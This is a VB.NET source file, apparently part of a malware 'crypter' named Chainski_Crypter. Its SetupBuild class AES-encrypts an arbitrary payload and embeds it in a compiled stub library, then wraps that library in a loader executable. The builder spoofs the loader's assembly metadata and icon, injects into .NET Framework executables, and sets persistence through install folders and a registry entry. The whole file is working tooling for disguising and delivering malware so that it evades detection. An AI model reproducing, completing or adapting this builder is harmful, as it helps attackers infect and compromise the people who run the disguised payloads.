Imports Microsoft.CSharp
Imports System
Imports System.CodeDom.Compiler
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.IO
Imports System.Linq
Imports System.Resources
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading
Imports System.Threading.Tasks

Namespace Chainski_Crypter.Build
	Public Class SetupBuild
		#Region "Fields"
		Public Property PayloadName() As String
		Public Property SaveFileName() As String
		Public Property IsInstall() As Boolean
		Public Property FileName() As String
		Public Property FolderName() As String
		Public Property SecondFolder() As String
		Public Property RegistryName() As String
		Public Property InjectionName() As String
		Public Property AssemblyTitle() As String
		Public Property AssemblyDescription() As String
		Public Property AssemblyProduct() As String
		Public Property AssemblyCompany() As String
		Public Property AssemblyCopyright() As String
		Public Property AssemblyTrademark() As String
		Public Property AssemblyMajorVersion() As String
		Public Property AssemblyMinorVersion() As String
		Public Property AssemblyBuildPart() As String
		Public Property AssemblyPrivatePart() As String
		Public Property AssemblyIcon() As String
		Public Property Stub() As String
		Public Property Loader() As String
		Public Property TempDirectory() As String
		Public Property LoaderResourcesName() As String
		Public Property StubResourcesName() As String
		Public Property PayloadResources() As String
		Public Property StubLib() As String
		Public Property AesKey() As String
		Public Property CommandLine() As String
		Public Property CommaLineIsChecked() As Boolean

		#End Region

		Public Function Compile() As String
			Dim destinationIconPath As String = Environment.CurrentDirectory & "\icon.ico"

			Try
				Directory.CreateDirectory(TempDirectory)
				Dim referencedAssemblies() As String = { "System.dll", "System.Windows.Forms.dll", "Microsoft.CSharp.dll", "System.Dynamic.Runtime.dll", "System.Core.dll"}
				Dim providerOptions As New Dictionary(Of String, String)() From {{"CompilerVersion", "v4.0" }}

'				#Region "Stub"
				Dim compilerOptions = "/target:library /platform:x86 /optimize+"

				Using cSharpCodeProvider As New CSharpCodeProvider(providerOptions)
					Dim compilerParameters As New CompilerParameters(referencedAssemblies) With {.GenerateExecutable = False, .OutputAssembly = Path.Combine(TempDirectory, StubLib & ".dll"), .CompilerOptions = compilerOptions, .TreatWarningsAsErrors = False, .IncludeDebugInformation = False, .TempFiles = New TempFileCollection(TempDirectory, False)}
					Using rw As New ResourceWriter(Path.Combine(TempDirectory, StubResourcesName & ".resources"))
						rw.AddResource(PayloadResources, AES_Encrypt(File.ReadAllBytes(PayloadName)))
						rw.Generate()
					End Using
					compilerParameters.EmbeddedResources.Add(Path.Combine(TempDirectory, StubResourcesName & ".resources"))

					Dim compilerResults As CompilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, Stub)
					If compilerResults.Errors.Count > 0 Then
						For Each compilerError As CompilerError In compilerResults.Errors
							Debug.WriteLine(String.Format("{0}" & ControlChars.Lf & "Line: {1} - Column: {2}" & ControlChars.Lf & "File: {3}", compilerError.ErrorText, compilerError.Line, compilerError.Column, compilerError.FileName))
							Return String.Format("{0}" & ControlChars.Lf & "Line: {1} - Column: {2}" & ControlChars.Lf & "File: {3}", compilerError.ErrorText, compilerError.Line, compilerError.Column, compilerError.FileName)
						Next compilerError
					End If
				End Using
'				#End Region

'				#Region "Loader"
				compilerOptions = "/target:winexe /platform:x86 /optimize+"

				If Not String.IsNullOrWhiteSpace(Me.AssemblyIcon) Then
					File.Copy(Me.AssemblyIcon, destinationIconPath, True)
					compilerOptions &= $" /win32icon:""{destinationIconPath}"""
				End If

				Using cSharpCodeProvider As New CSharpCodeProvider(providerOptions)
					Dim compilerParameters As New CompilerParameters(referencedAssemblies) With {.GenerateExecutable = True, .OutputAssembly = Me.SaveFileName, .CompilerOptions = compilerOptions, .TreatWarningsAsErrors = False, .IncludeDebugInformation = False, .TempFiles = New TempFileCollection(TempDirectory, False)}
					Using rw As New ResourceWriter(Path.Combine(TempDirectory, LoaderResourcesName & ".resources"))
						rw.AddResource(StubLib, AES_Encrypt(File.ReadAllBytes(Path.Combine(TempDirectory, StubLib & ".dll"))))
						rw.Generate()
					End Using
					compilerParameters.EmbeddedResources.Add(Path.Combine(TempDirectory, LoaderResourcesName & ".resources"))

					Dim compilerResults As CompilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, Loader)
					If compilerResults.Errors.Count > 0 Then

						For Each compilerError As CompilerError In compilerResults.Errors
							Debug.WriteLine(String.Format("{0}" & ControlChars.Lf & "Line: {1} - Column: {2}" & ControlChars.Lf & "File: {3}", compilerError.ErrorText, compilerError.Line, compilerError.Column, compilerError.FileName))
							Return String.Format("{0}" & ControlChars.Lf & "Line: {1} - Column: {2}" & ControlChars.Lf & "File: {3}", compilerError.ErrorText, compilerError.Line, compilerError.Column, compilerError.FileName)
						Next compilerError
					End If

					If File.Exists(destinationIconPath) Then
						File.Delete(destinationIconPath)
					End If
					If Directory.Exists(TempDirectory) Then
						Directory.Delete(TempDirectory, True)
					End If
					Return "Done!"
				End Using
'				#End Region
			Catch ex As Exception
				Debug.WriteLine(ex)
				Try
					If File.Exists(destinationIconPath) Then
						File.Delete(destinationIconPath)
					End If
					If Directory.Exists(TempDirectory) Then
						Directory.Delete(TempDirectory, True)
					End If
				Catch
				End Try
				Return ex.Message
			End Try
		End Function

		Public Sub PrepareSource()
			Loader = Loader.Replace("#Stub", StubLib)
			Loader = Loader.Replace("#ParentResource", LoaderResourcesName)
			Loader = Loader.Replace("#AesKey", AesKey)

			Loader = Loader.Replace("#AssemblyTitle", AssemblyTitle)
			Loader = Loader.Replace("#AssemblyDescription", AssemblyDescription)
			Loader = Loader.Replace("#AssemblyProduct", AssemblyProduct)
			Loader = Loader.Replace("#AssemblyCompany", AssemblyCompany)
			Loader = Loader.Replace("#AssemblyCopyright", AssemblyCopyright)
			Loader = Loader.Replace("#AssemblyTrademark", AssemblyTrademark)
			Loader = Loader.Replace("#AssemblyMajorVersion", AssemblyMajorVersion)
			Loader = Loader.Replace("#AssemblyMinorVersion", AssemblyMinorVersion)
			Loader = Loader.Replace("#AssemblyBuildPart", AssemblyBuildPart)
			Loader = Loader.Replace("#AssemblyMajorVersion", AssemblyMajorVersion)
			Loader = Loader.Replace("#AssemblyPrivatePart", AssemblyPrivatePart)
			Loader = Loader.Replace("#Guid", Guid.NewGuid().ToString())

			Stub = Stub.Replace("#ParentResource", StubResourcesName)
			Stub = Stub.Replace("#Payload", PayloadResources)
			If InjectionName = "Itself" Then
				InjectionName = "Application.ExecutablePath"
				Stub = Stub.Replace("#Injection", InjectionName)
			Else
				Stub = Stub.Replace("#Injection", "Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace(""Framework64"", ""Framework""), """ & InjectionName & ".exe"")")
			End If
			Stub = Stub.Replace("#AesKey", AesKey)

			If IsInstall Then
				Stub = Stub.Replace("//#define install", "#define install")
			End If

			If CommaLineIsChecked Then
				Stub = Stub.Replace("#cmd", CommandLine)
			Else
				Stub = Stub.Replace("#cmd", "")
			End If

			Stub = Stub.Replace("#FileName", FileName & ".exe")
			Stub = Stub.Replace("@FolderName", "" & FolderName & "")
			Stub = Stub.Replace("#SecondFolder", SecondFolder)
			Stub = Stub.Replace("#RegistryName", RegistryName)
		End Sub
		Private Function AES_Encrypt(ByVal bytesToBeEncrypted() As Byte) As Byte()
			Dim encryptedBytes() As Byte = Nothing
			Dim saltBytes() As Byte = { 1, 2, 3, 4, 5, 6, 7, 8 }
			Using ms As New MemoryStream()
				Using AES As New RijndaelManaged()
					AES.KeySize = 256
					AES.BlockSize = 256
					Dim passwordBytes = Encoding.UTF8.GetBytes(AesKey)
					Dim key = New Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000)
					AES.Key = key.GetBytes(AES.KeySize \ 8)
					AES.IV = key.GetBytes(AES.BlockSize \ 8)
					AES.Mode = CipherMode.CBC
					Using cs = New CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write)
						cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length)
						cs.Close()
					End Using
					encryptedBytes = ms.ToArray()
				End Using
			End Using
			Return encryptedBytes
		End Function
	End Class
End Namespace
